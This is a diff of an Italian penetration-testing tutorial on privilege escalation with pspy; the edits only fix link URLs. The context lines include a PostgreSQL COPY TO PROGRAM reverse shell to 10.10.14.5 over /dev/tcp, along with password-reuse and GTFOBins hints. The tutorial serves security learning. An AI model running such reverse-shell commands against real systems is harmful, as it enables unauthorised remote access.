@@ -302,7 +302,7 @@ mysql> SELECT username, password FROM admin_users;
 
 **Alternative exploitation:**
 
-Se [MySQL](https://hackita.it/articoli/mysql) è solo interno, usa **password reuse**:
+Se [MySQL](https://hackita.it/articoli/porta-3306-mysql/) è solo interno, usa **password reuse**:
 
 ```bash
 # Testa root DB password su SSH
@@ -425,7 +425,7 @@ done
 
 Permette monitoring passivo: lasci girare pspy, e vieni notificato solo quando trova qualcosa di interessante.
 
-### Correlazione con [LinEnum](https://hackita.it/articoli/linenum)/pspy combo
+### Correlazione con [LinEnum](https://hackita.it/articoli/linenum/)/pspy combo
 
 Combina enumeration statica (LinEnum) con monitoring dinamico (pspy).
 
@@ -597,7 +597,7 @@ webapp_db=> COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/10.10.14.5
 
 **Timeline:** 20 min monitoring + 5 min exploitation
 
-Se vuoi approfondire tecniche di exploitation database e SQL injection avanzate, leggi [privilege escalation tramite database misconfiguration](https://hackita.it/articoli/database-privilege-escalation).
+Se vuoi approfondire tecniche di exploitation database e SQL injection avanzate, leggi [privilege escalation tramite database misconfiguration](https://hackita.it/articoli/database-privilege-escalation/).
 
 ***
 
@@ -708,7 +708,7 @@ sudo systemctl status webapp
 # root shell
 ```
 
-GTFOBins è cruciale per sapere **come** abusare comandi che pspy scopre. Puoi approfondire l'uso di GTFOBins nella nostra [guida completa al databa](https://hackita.it/articoli/gtfobins-exploitation)[guida completa al database GTFOBins per privilege escalation](https://hackita.it/articoli/gtfobins)
+GTFOBins è cruciale per sapere **come** abusare comandi che pspy scopre. Puoi approfondire l'uso di GTFOBins nella nostra [guida completa al databa](https://hackita.it/articoli/gtfobins/)[guida completa al database GTFOBins per privilege escalation](https://hackita.it/articoli/gtfobins/)
 
 ***
 
@@ -716,7 +716,7 @@ GTFOBins è cruciale per sapere **come** abusare comandi che pspy scopre. Puoi a
 
 pspy identifica vulnerabilità, poi usi tool specifici.
 
-**pspy → [Metasploit](https://hackita.it/articoli/metasploit):**
+**pspy → [Metasploit](https://hackita.it/articoli/metasploit/):**
 
 ```bash
 # pspy trova vulnerable ImageMagick
@@ -786,7 +786,7 @@ Use **pspy** when:
 
 ***
 
-**FASE 1: Initial Access - [LFI](https://hackita.it/articoli/lfi) to [RCE](https://hackita.it/articoli/rce)**
+**FASE 1: Initial Access - [LFI](https://hackita.it/articoli/lfi/) to [RCE](https://hackita.it/articoli/rce/)**
 
 ```bash
 # Vulnerable parameter
@@ -894,10 +894,10 @@ root@target:/# cat /root/root.txt
 
 **Tools usati:**
 
-1. [cURL](https://hackita.it/articoli/curl) (web exploitation)
+1. [cURL](https://hackita.it/articoli/curl/) (web exploitation)
 2. Python (reverse shell)
 3. **pspy** (process discovery - KEY TOOL)
-4. [Netcat](https://hackita.it/articoli/netcat) (shell listener)
+4. [Netcat](https://hackita.it/articoli/netcat/) (shell listener)
 
 **Ruolo critico di pspy:** Senza pspy, cron job nascosto sarebbe rimasto invisibile. Enumeration statica non lo aveva trovato perché era user-specific cron (`/var/spool/cron/crontabs/root` unreadable). pspy ha catturato l'esecuzione real-time.
 
